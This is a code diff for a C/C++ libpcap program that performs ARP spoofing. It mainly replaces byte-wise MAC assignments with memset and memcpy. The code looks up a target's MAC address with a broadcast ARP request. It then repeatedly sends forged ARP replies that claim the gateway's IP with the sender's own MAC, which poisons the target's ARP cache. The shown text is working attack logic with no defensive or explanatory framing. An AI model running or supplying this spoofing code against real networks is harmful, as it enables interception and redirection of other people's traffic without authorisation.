@@ -99,19 +99,9 @@ int main(int argc, char* argv[]) {
 
     EthArpPacket ReqReppacket;
 
-    ReqReppacket.eth.ether_dhost[0] = 0xFF;
-    ReqReppacket.eth.ether_dhost[1] = 0xFF;
-    ReqReppacket.eth.ether_dhost[2] = 0xFF;
-    ReqReppacket.eth.ether_dhost[3] = 0xFF;
-    ReqReppacket.eth.ether_dhost[4] = 0xFF;
-    ReqReppacket.eth.ether_dhost[5] = 0xFF;
+    memset(ReqReppacket.eth.ether_dhost, 0xFF, sizeof(ReqReppacket.eth.ether_dhost));
 
-    ReqReppacket.eth.ether_shost[0] = mac_addr[0];
-    ReqReppacket.eth.ether_shost[1] = mac_addr[1];
-    ReqReppacket.eth.ether_shost[2] = mac_addr[2];
-    ReqReppacket.eth.ether_shost[3] = mac_addr[3];
-    ReqReppacket.eth.ether_shost[4] = mac_addr[4];
-    ReqReppacket.eth.ether_shost[5] = mac_addr[5];
+    memcpy(&ReqReppacket.eth.ether_shost, &mac_addr, sizeof(mac_addr));
 
     ReqReppacket.eth.ether_type = htons(ETHERTYPE_ARP);
 
@@ -121,20 +111,12 @@ int main(int argc, char* argv[]) {
     ReqReppacket.arp.pln_ = 4;
     ReqReppacket.arp.op_ = htons(ARPOP_REQUEST);
 
-    ReqReppacket.arp.smac[0] = mac_addr[0]; //my
-    ReqReppacket.arp.smac[1] = mac_addr[1];
-    ReqReppacket.arp.smac[2] = mac_addr[2];
-    ReqReppacket.arp.smac[3] = mac_addr[3];
-    ReqReppacket.arp.smac[4] = mac_addr[4];
-    ReqReppacket.arp.smac[5] = mac_addr[5];
+    memcpy(&ReqReppacket.arp.smac, &mac_addr, sizeof(mac_addr)); //my
+
     ReqReppacket.arp.sip = htonl(Ip(IP_addr));
 
-    ReqReppacket.arp.tmac[0] = 0x00; //you
-    ReqReppacket.arp.tmac[1] = 0x00;
-    ReqReppacket.arp.tmac[2] = 0x00;
-    ReqReppacket.arp.tmac[3] = 0x00;
-    ReqReppacket.arp.tmac[4] = 0x00;
-    ReqReppacket.arp.tmac[5] = 0x00;
+    memset(ReqReppacket.arp.tmac, 0x00, sizeof(ReqReppacket.arp.tmac)); //you
+
     ReqReppacket.arp.tip = htonl(Ip(argv[2]));
 
 
@@ -161,16 +143,14 @@ int main(int argc, char* argv[]) {
         if(etharp->eth.ether_type != htons(ETHERTYPE_ARP)) continue;
         if(etharp->arp.op_ != htons(ARPOP_REPLY)) continue;
         if(etharp->arp.sip != htonl(Ip(argv[2]))) continue;
-        else
-        for(int i=0; i<6; i++){
-            ReqReppacket.eth.ether_dhost[i] = etharp->eth.ether_shost[i];
-            ReqReppacket.arp.tmac[i] = etharp->arp.smac[i];
-        }
+
+        memcpy(&ReqReppacket.eth.ether_dhost, &etharp->eth.ether_shost, sizeof(ReqReppacket.eth.ether_dhost));
+        memcpy(&ReqReppacket.arp.tmac, &etharp->arp.smac, sizeof(ReqReppacket.arp.tmac));
         ReqReppacket.arp.op_ = htons(ARPOP_REPLY);
         ReqReppacket.arp.sip = htonl(Ip(argv[3])); // gateway
 
         for(int sned = 0; sned<5; sned++){
-        int reply = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&ReqReppacket) ,sizeof(EthArpPacket));
+            int reply = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&ReqReppacket) ,sizeof(EthArpPacket));
             if (reply != 0) {
                 fprintf(stderr, "pcap_sendpacket return %d error=%s\n", reply, pcap_geterr(handle));
             }
